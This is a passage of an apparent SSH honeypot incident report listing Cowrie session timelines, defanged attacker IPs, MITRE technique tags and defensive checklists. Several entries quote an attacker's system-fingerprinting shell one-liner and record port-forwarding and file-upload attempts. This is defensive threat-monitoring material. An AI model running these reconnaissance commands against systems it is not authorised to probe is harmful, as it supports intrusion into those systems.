| `2026-08-16 11:30:57` | `cowrie.command.input` |
| `2026-08-16 11:30:57` | `cowrie.command.success` |
| `2026-08-16 11:30:57` | `cowrie.command.input` |
| `2026-08-16 11:30:57` | `cowrie.command.input` |
| `2026-08-16 11:30:57` | `cowrie.command.input` |
| `2026-08-16 11:30:57` | `cowrie.command.input` |
| `2026-08-16 11:30:58` | `cowrie.log.closed` |
| `2026-08-16 11:30:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e588a7c98b

| Field | Detail |
|---|---|
| **Source IP** | `222.174.184[.]86` |
| **First Seen** | 2026-08-16 11:31 |
| **Last Seen** | 2026-08-16 11:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:31:51` | `cowrie.session.connect` |
| `2026-08-16 11:31:52` | `cowrie.client.version` |
| `2026-08-16 11:31:52` | `cowrie.client.kex` |
| `2026-08-16 11:31:54` | `cowrie.login.success` |
| `2026-08-16 11:31:56` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.174.184[.]86` to AbuseIPDB if not already reported
- [ ] Block `222.174.184[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a3109cc793

| Field | Detail |
|---|---|
| **Source IP** | `218.21.241[.]50` |
| **First Seen** | 2026-08-16 11:32 |
| **Last Seen** | 2026-08-16 11:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:32:01` | `cowrie.session.connect` |
| `2026-08-16 11:32:02` | `cowrie.client.version` |
| `2026-08-16 11:32:02` | `cowrie.client.kex` |
| `2026-08-16 11:32:04` | `cowrie.login.success` |
| `2026-08-16 11:32:04` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `218.21.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b524a45d3fbb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:32 |
| **Last Seen** | 2026-08-16 11:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:32:25` | `cowrie.session.connect` |
| `2026-08-16 11:32:25` | `cowrie.client.version` |
| `2026-08-16 11:32:25` | `cowrie.client.kex` |
| `2026-08-16 11:32:26` | `cowrie.login.success` |
| `2026-08-16 11:32:28` | `cowrie.session.params` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.command.success` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.command.input` |
| `2026-08-16 11:32:28` | `cowrie.log.closed` |
| `2026-08-16 11:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d39a1c8963cc

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-16 11:33 |
| **Last Seen** | 2026-08-16 11:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:33:04` | `cowrie.session.connect` |
| `2026-08-16 11:33:04` | `cowrie.client.version` |
| `2026-08-16 11:33:04` | `cowrie.client.kex` |
| `2026-08-16 11:33:05` | `cowrie.login.success` |
| `2026-08-16 11:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d33a5c3c5a2

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-16 11:33 |
| **Last Seen** | 2026-08-16 11:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:33:10` | `cowrie.session.connect` |
| `2026-08-16 11:33:10` | `cowrie.client.version` |
| `2026-08-16 11:33:10` | `cowrie.client.kex` |
| `2026-08-16 11:33:10` | `cowrie.login.success` |
| `2026-08-16 11:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57aaa7ba841

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:33 |
| **Last Seen** | 2026-08-16 11:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:33:55` | `cowrie.session.connect` |
| `2026-08-16 11:33:55` | `cowrie.client.version` |
| `2026-08-16 11:33:55` | `cowrie.client.kex` |
| `2026-08-16 11:33:57` | `cowrie.login.success` |
| `2026-08-16 11:33:58` | `cowrie.session.params` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.command.success` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.command.input` |
| `2026-08-16 11:33:58` | `cowrie.log.closed` |
| `2026-08-16 11:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922e9fa8de9c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:35 |
| **Last Seen** | 2026-08-16 11:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:35:26` | `cowrie.session.connect` |
| `2026-08-16 11:35:26` | `cowrie.client.version` |
| `2026-08-16 11:35:26` | `cowrie.client.kex` |
| `2026-08-16 11:35:27` | `cowrie.login.success` |
| `2026-08-16 11:35:28` | `cowrie.session.params` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:28` | `cowrie.command.success` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:28` | `cowrie.command.input` |
| `2026-08-16 11:35:29` | `cowrie.log.closed` |
| `2026-08-16 11:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-951e4f8b3581

| Field | Detail |
|---|---|
| **Source IP** | `101.96.212[.]81` |
| **First Seen** | 2026-08-16 11:35 |
| **Last Seen** | 2026-08-16 11:40 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:35:46` | `cowrie.session.connect` |
| `2026-08-16 11:35:46` | `cowrie.client.version` |
| `2026-08-16 11:35:47` | `cowrie.client.kex` |
| `2026-08-16 11:35:49` | `cowrie.login.success` |
| `2026-08-16 11:40:49` | `cowrie.session.file_upload` |
| `2026-08-16 11:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.212[.]81` to AbuseIPDB if not already reported
- [ ] Block `101.96.212[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-569df45aaf20

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:36 |
| **Last Seen** | 2026-08-16 11:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:36:58` | `cowrie.session.connect` |
| `2026-08-16 11:36:58` | `cowrie.client.version` |
| `2026-08-16 11:36:58` | `cowrie.client.kex` |
| `2026-08-16 11:36:59` | `cowrie.login.success` |
| `2026-08-16 11:37:00` | `cowrie.session.params` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.command.success` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.command.input` |
| `2026-08-16 11:37:00` | `cowrie.log.closed` |
| `2026-08-16 11:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce4dc211a1d1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:38 |
| **Last Seen** | 2026-08-16 11:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:38:33` | `cowrie.session.connect` |
| `2026-08-16 11:38:33` | `cowrie.client.version` |
| `2026-08-16 11:38:33` | `cowrie.client.kex` |
| `2026-08-16 11:38:34` | `cowrie.login.success` |
| `2026-08-16 11:38:35` | `cowrie.session.params` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.command.success` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.command.input` |
| `2026-08-16 11:38:35` | `cowrie.log.closed` |
| `2026-08-16 11:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8f7d4708283

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 11:39 |
| **Last Seen** | 2026-08-16 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:39:26` | `cowrie.session.connect` |
| `2026-08-16 11:39:26` | `cowrie.client.version` |
| `2026-08-16 11:39:26` | `cowrie.client.kex` |
| `2026-08-16 11:39:26` | `cowrie.login.success` |
| `2026-08-16 11:39:27` | `cowrie.session.params` |
| `2026-08-16 11:39:27` | `cowrie.command.input` |
| `2026-08-16 11:39:27` | `cowrie.log.closed` |
| `2026-08-16 11:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c006fc32dc1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:40 |
| **Last Seen** | 2026-08-16 11:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:40:09` | `cowrie.session.connect` |
| `2026-08-16 11:40:09` | `cowrie.client.version` |
| `2026-08-16 11:40:09` | `cowrie.client.kex` |
| `2026-08-16 11:40:10` | `cowrie.login.success` |
| `2026-08-16 11:40:11` | `cowrie.session.params` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:11` | `cowrie.command.success` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:11` | `cowrie.command.input` |
| `2026-08-16 11:40:12` | `cowrie.log.closed` |
| `2026-08-16 11:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcee6046c02c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:41 |
| **Last Seen** | 2026-08-16 11:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:41:45` | `cowrie.session.connect` |
| `2026-08-16 11:41:46` | `cowrie.client.version` |
| `2026-08-16 11:41:46` | `cowrie.client.kex` |
| `2026-08-16 11:41:47` | `cowrie.login.success` |
| `2026-08-16 11:41:47` | `cowrie.session.params` |
| `2026-08-16 11:41:47` | `cowrie.command.input` |
| `2026-08-16 11:41:47` | `cowrie.command.input` |
| `2026-08-16 11:41:47` | `cowrie.command.input` |
| `2026-08-16 11:41:47` | `cowrie.command.input` |
| `2026-08-16 11:41:48` | `cowrie.command.input` |
| `2026-08-16 11:41:48` | `cowrie.command.success` |
| `2026-08-16 11:41:48` | `cowrie.command.input` |
| `2026-08-16 11:41:48` | `cowrie.command.input` |
| `2026-08-16 11:41:48` | `cowrie.command.input` |
| `2026-08-16 11:41:48` | `cowrie.command.input` |
| `2026-08-16 11:41:48` | `cowrie.log.closed` |
| `2026-08-16 11:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3f384be1249

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:43 |
| **Last Seen** | 2026-08-16 11:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:43:22` | `cowrie.session.connect` |
| `2026-08-16 11:43:23` | `cowrie.client.version` |
| `2026-08-16 11:43:23` | `cowrie.client.kex` |
| `2026-08-16 11:43:24` | `cowrie.login.success` |
| `2026-08-16 11:43:25` | `cowrie.session.params` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.command.success` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.command.input` |
| `2026-08-16 11:43:25` | `cowrie.log.closed` |
| `2026-08-16 11:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eece1550ede0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:45 |
| **Last Seen** | 2026-08-16 11:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:45:01` | `cowrie.session.connect` |
| `2026-08-16 11:45:01` | `cowrie.client.version` |
| `2026-08-16 11:45:01` | `cowrie.client.kex` |
| `2026-08-16 11:45:02` | `cowrie.login.success` |
| `2026-08-16 11:45:03` | `cowrie.session.params` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:03` | `cowrie.command.success` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:03` | `cowrie.command.input` |
| `2026-08-16 11:45:04` | `cowrie.log.closed` |
| `2026-08-16 11:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2173e27ddf60

| Field | Detail |
|---|---|
| **Source IP** | `111.46.77[.]2` |
| **First Seen** | 2026-08-16 11:46 |
| **Last Seen** | 2026-08-16 11:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:46:19` | `cowrie.session.connect` |
| `2026-08-16 11:46:20` | `cowrie.client.version` |
| `2026-08-16 11:46:20` | `cowrie.client.kex` |
